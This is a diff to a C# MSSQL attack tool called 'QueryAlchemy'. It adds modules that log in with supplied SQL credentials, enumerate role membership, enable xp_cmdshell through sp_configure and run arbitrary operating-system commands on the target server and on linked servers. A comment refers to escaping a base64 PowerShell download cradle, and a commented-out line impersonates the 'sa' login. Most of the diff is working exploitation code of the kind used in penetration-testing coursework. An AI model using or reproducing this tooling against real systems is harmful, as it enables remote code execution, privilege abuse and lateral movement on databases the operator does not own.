@@ -29,10 +29,14 @@ namespace QueryAlchemy
 
             Console.WriteLine("Choose an option from the following list:");
             Console.WriteLine("\te - Enumerate");
+            Console.WriteLine("\tse - Enumerate Using Specific SQL Login");
             Console.WriteLine("\tu - Attempt UNC Path Injection");
             Console.WriteLine("\tp - Attempt Privilege Escalation via Login Impersonation");
             Console.WriteLine("\tc - Perform Code Execution");
             Console.WriteLine("\tl - Abuse SQL Links");
+            Console.WriteLine("\tq - Run Custom Query");
+            Console.WriteLine("\tql - Run Custom Query As Specific SQL Login");
+            //Console.WriteLine("\tiq - Impersonate SA Then Run Custom Query"); I thought about implementing this but I actually took it out, check notion if you need to put code back in later
             Console.Write("Your option? ");
 
             switch (Console.ReadLine())
@@ -99,6 +103,75 @@ namespace QueryAlchemy
                     reader.Close();
 
                     con.Close();
+                    break;
+
+                case "se": //Enumerate info from SQL server using specfic SQL login
+                    Console.WriteLine($"Enumerating SQL Server Using Specific SQL Login\n");
+
+                    Console.WriteLine("Enter SQL login username: ");
+                    String seusername = Console.ReadLine();
+                    Console.WriteLine("\nEnter SQL login password: ");
+                    String sepassword = Console.ReadLine();
+
+                    String seconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = False; User ID=" + seusername + "; Password= " + sepassword + "";
+                    SqlConnection secon = new SqlConnection(seconString); //provide connection string arg to constructor
+
+                    try
+                    {
+                        secon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
+                        Console.WriteLine("Auth success!");
+                    }
+                    catch //if the auth connection fails we catch the error and print auth failed to console
+                    {
+                        Console.WriteLine("Auth failed");
+                        Environment.Exit(0);
+                    }
+
+                    String sequerylogin = "SELECT SYSTEM_USER;"; //The SYSTEM_USER SQL variable contains the name of the SQL login for the current session. If we can execute the SQL command "SELECT SYSTEM_USER;", we should get the SQL login.
+                    SqlCommand secommand = new SqlCommand(sequerylogin, secon); //use the sqlcommand class to execute an arbitrary sql query and return the output to us
+                    SqlDataReader sereader = secommand.ExecuteReader(); //use SqlDataReader to read the returned query
+                    sereader.Read(); //call the read method to return result of query
+                    Console.WriteLine("Logged in as: " + sereader[0]); //access the returned query in the reader object via array indexing and print result to console
+                    sereader.Close(); //make sure to close this so we can execute sql queries in proper order, sql connection will be blocked if we don't invoke this
+
+                    String sequeryuser = "SELECT USER_NAME();"; //query the user so we can figure out what domain user it is mapped to
+                    secommand = new SqlCommand(sequeryuser, secon);
+                    sereader = secommand.ExecuteReader();
+                    sereader.Read();
+                    Console.WriteLine("Mapped to user: " + sereader[0]);
+                    sereader.Close();
+
+                    String sequerypublicrole = "SELECT IS_SRVROLEMEMBER('public');"; //Determine if a specific logon is a member of a server role
+                    secommand = new SqlCommand(sequerypublicrole, secon); //Here we are determining if member is part of 'public' role
+                    sereader = secommand.ExecuteReader();
+                    sereader.Read();
+                    Int32 serole = Int32.Parse(sereader[0].ToString());
+                    if (serole == 1)
+                    {
+                        Console.WriteLine("User is a member of public role");
+                    }
+                    else
+                    {
+                        Console.WriteLine("User is NOT a member of public role");
+                    }
+                    sereader.Close();
+
+                    String sequerysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');"; //find out if member is part of sysadmin role
+                    secommand = new SqlCommand(sequerysysadminrole, secon);
+                    sereader = secommand.ExecuteReader();
+                    sereader.Read();
+                    serole = Int32.Parse(sereader[0].ToString());
+                    if (serole == 1)
+                    {
+                        Console.WriteLine("User is a member of sysadmin role");
+                    }
+                    else
+                    {
+                        Console.WriteLine("User is NOT a member of sysadmin role");
+                    }
+                    sereader.Close();
+
+                    secon.Close();
                     break;
 
                 //UNC Path Injection
@@ -261,6 +334,7 @@ namespace QueryAlchemy
 
                     Console.WriteLine("Choose an option from the following list:");
                     Console.WriteLine("\txp - Perform Code Exec Using XP_CMDSHELL");
+                    Console.WriteLine("\tsxp - Perform Code Exec via XP_CMDSHELL Using A Specific SQL Login Instead Of Windows Auth");
                     Console.WriteLine("\tole - Perform Code Exec Using OLE Stored Procedure");
                     Console.WriteLine("\tca - Perform Code Exec Using Custom Assembly (Under Development)");
                     Console.Write("Your option? ");
@@ -308,6 +382,56 @@ namespace QueryAlchemy
                             Console.WriteLine("Result of command is: " + xpreader[0]);
                             xpreader.Close();
                             xpcon.Close();
+
+                            break;
+
+                        case "sxp": //Code exec via xp_cmdshell with SQL login instead of Windows Auth
+                            Console.WriteLine($"Performing Code Exec via XP_CMDSHELL Using SQL Login Instead Of Windows Auth\n");
+                            Console.WriteLine($"Advisory: The SQL login you use MUST have sysadmin role privileges on the target SQL server to use XP_CMDSHELL\n");
+
+                            Console.WriteLine("Enter SQL login username: ");
+                            String sxpusername = Console.ReadLine();
+                            Console.WriteLine("\nEnter SQL login password: ");
+                            String sxppassword = Console.ReadLine();
+
+                            //Get command to run from user input
+                            Console.WriteLine("Enter a command to run, all commands will be run like this on SQL server 'EXEC xp_cmdshell $yourcmd'\n");
+                            String usersxpcmd = Console.ReadLine();
+                            Console.WriteLine("Command received: " + usersxpcmd);
+                            Console.WriteLine("Executing...");
+
+                            String sxpconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = False; User ID=" + sxpusername + "; Password= " + sxppassword + ""; 
+                            SqlConnection sxpcon = new SqlConnection(sxpconString); //provide connection string arg to constructor
+
+                            try
+                            {
+                                sxpcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
+                                Console.WriteLine("Auth success!");
+                            }
+                            catch //if the auth connection fails we catch the error and print auth failed to console
+                            {
+                                Console.WriteLine("Auth failed");
+                                Environment.Exit(0);
+                            }
+
+                            //String sxpimpersonateUser = "EXECUTE AS LOGIN = 'sa';"; //impersonate sa login, so we have sysadmin role privileges, thus allowing us to enable xp_cmdshell
+                            String enable_sxpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"; //enable xp_cmdshell
+                            String sxpexecCmd = "EXEC xp_cmdshell '" + usersxpcmd + "'"; //execute user input command via xp_cmdshell
+
+                            //SqlCommand xpcommand = new SqlCommand(impersonateUser, xpcon);
+                            //SqlDataReader xpreader = xpcommand.ExecuteReader();
+                            //xpreader.Close();
+
+                            SqlCommand sxpcommand = new SqlCommand(enable_sxpcmd, sxpcon);
+                            SqlDataReader sxpreader = sxpcommand.ExecuteReader();
+                            sxpreader.Close();
+
+                            sxpcommand = new SqlCommand(sxpexecCmd, sxpcon);
+                            sxpreader = sxpcommand.ExecuteReader();
+                            sxpreader.Read();
+                            Console.WriteLine("Result of command is: " + sxpreader[0]);
+                            sxpreader.Close();
+                            sxpcon.Close();
 
                             break;
 
@@ -427,6 +551,7 @@ namespace QueryAlchemy
                     Console.WriteLine("\tus - Enumerate User Info and Security Context");
                     Console.WriteLine("\tlv - Enumerate Version Info From Linked Server");
                     Console.WriteLine("\tlxp - Perform Code Execution On Linked Server Using XP_CMDSHELL");
+                    Console.WriteLine("\tlsxp - Perform Code Execution On Linked Server via XP_CMDSHELL Using SQL Login Instead Of Windows Auth");
                     Console.WriteLine("\tdle - Double Link: Enumerate List Of Linked SQL Servers");
                     Console.WriteLine("\tdus - Double Link: Enumerate User Info and Security Context From Linked Server");
                     Console.WriteLine("\tdxp - Double Link: Perform Code Execution From First Linked Server On Second Linked Server Using XP_CMDSHELL");
@@ -598,6 +723,62 @@ namespace QueryAlchemy
 
                             break;
 
+                        case "lsxp":
+                            Console.WriteLine($"Performing Code Exec On Linked Server via XP_CMDSHELL Using SQL Login\n");
+
+                            //Get the SQL login creds from the user
+                            Console.WriteLine("Enter SQL login username: ");
+                            String lsxpusername = Console.ReadLine();
+                            Console.WriteLine("\nEnter SQL login password: ");
+                            String lsxppassword = Console.ReadLine();
+
+                            Console.WriteLine("\nEnter name of SQL link, this should be the hostname or FQDN of linked server:\n");
+                            String lsxplinkname = Console.ReadLine();
+                            Console.WriteLine("Targeting Linked Server: " + lsxplinkname + "\n");
+
+                            //Get command to run from user input
+                            Console.WriteLine("Enter a command to run, all commands will be run like this on SQL server 'EXEC xp_cmdshell $yourcmd'\n");
+                            String userlsxpcmd = Console.ReadLine();
+                            Console.WriteLine("Command received: " + userlsxpcmd);
+                            Console.WriteLine("Executing...");
+
+                            String lsxpconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = False; User ID=" + lsxpusername + "; Password= " + lsxppassword + "";
+                            SqlConnection lsxpcon = new SqlConnection(lsxpconString); //provide connection string arg to constructor
+
+                            try
+                            {
+                                lsxpcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
+                                Console.WriteLine("Auth success!");
+                            }
+                            catch //if the auth connection fails we catch the error and print auth failed to console
+                            {
+                                Console.WriteLine("Auth failed");
+                                Environment.Exit(0);
+                            }
+
+                            String lsxpenableadvoptions = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + lsxplinkname;
+                            String lsxpenablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + lsxplinkname; //enable xp_cmdshell so we can perform cmd exec on linked sql server
+                            //This part was the trickiest, getting the b64 encoded PS download cradle to be properly escaped, refer to this link for help https://notes.qazeer.io/l7/methodology-14 
+                            String lsxpexecCmd = "EXEC ('xp_cmdshell ''" + userlsxpcmd + "''') AT " + lsxplinkname;
+
+
+                            SqlCommand lsxpcommand = new SqlCommand(lsxpenableadvoptions, lsxpcon);
+                            SqlDataReader lsxpreader = lsxpcommand.ExecuteReader();
+                            lsxpreader.Close();
+
+                            lsxpcommand = new SqlCommand(lsxpenablexpcmdshell, lsxpcon);
+                            lsxpreader = lsxpcommand.ExecuteReader();
+                            lsxpreader.Close();
+
+                            lsxpcommand = new SqlCommand(lsxpexecCmd, lsxpcon);
+                            lsxpreader = lsxpcommand.ExecuteReader();
+                            //Console.WriteLine("Result of command is: " + lsxpreader[0]);
+                            lsxpreader.Close();
+
+                            lsxpcon.Close();
+
+                            break;
+
                         case "dle":
                             Console.WriteLine($"Enumerating List Of Linked Servers From Linked Server\n");
                             Console.WriteLine("This module will find all of the links on a linked server\n");
@@ -735,6 +916,64 @@ namespace QueryAlchemy
 
                             break;
                     }
+                break;
+                
+                case "q":
+                    Console.WriteLine($"Running Custom Query\n");
+                    Console.WriteLine("Enter query to run: ");
+                    String customquery = Console.ReadLine();
+
+                    String qconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;"; //build our connection string, specify we want to use windows auth with the Integrated Security setting
+                    SqlConnection qcon = new SqlConnection(qconString); //provide connection string arg to constructor
+
+                    try
+                    {
+                        qcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
+                        Console.WriteLine("Auth success!");
+                    }
+                    catch //if the auth connection fails we catch the error and print auth failed to console
+                    {
+                        Console.WriteLine("Auth failed");
+                        Environment.Exit(0);
+                    }
+
+                    SqlCommand runcustomquery = new SqlCommand(customquery, qcon);
+                    SqlDataReader qreader = runcustomquery.ExecuteReader();
+                    qreader.Read();
+                    Console.WriteLine("Result of query is: " + qreader[0]);
+                    qreader.Close();
+
+                    break;
+                //Run Custom Query as specific SQL login: http://csharp.net-informations.com/data-providers/csharp-sql-server-connection.htm <= This helped
+                case "ql":
+                    Console.WriteLine($"Running Custom Query As Specific SQL Login\n");
+                    Console.WriteLine("This module will execute a query via SQL authentication instead of Windows authentication\n");
+                    Console.WriteLine("Enter SQL login username: ");
+                    String qlusername = Console.ReadLine();
+                    Console.WriteLine("\nEnter SQL login password: ");
+                    String qlpassword = Console.ReadLine();
+                    Console.WriteLine("\nEnter query to run: ");
+                    String qlcustomquery = Console.ReadLine();
+
+                    String qlconString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = False; User ID=" + qlusername + "; Password= " + qlpassword + ""; //build our connection string, specify we want to use windows auth with the Integrated Security setting
+                    SqlConnection qlcon = new SqlConnection(qlconString); //provide connection string arg to constructor
+
+                    try
+                    {
+                        qlcon.Open(); //Once the SqlConnection object has been created, we use the Open method to initiate the connection
+                        Console.WriteLine("Auth success!");
+                    }
+                    catch //if the auth connection fails we catch the error and print auth failed to console
+                    {
+                        Console.WriteLine("Auth failed");
+                        Environment.Exit(0);
+                    }
+
+                    SqlCommand qlruncustomquery = new SqlCommand(qlcustomquery, qlcon);
+                    SqlDataReader qlreader = qlruncustomquery.ExecuteReader();
+                    qlreader.Read();
+                    Console.WriteLine("Result of query is: " + qlreader[0]);
+                    qlreader.Close();
 
                     break;
             }
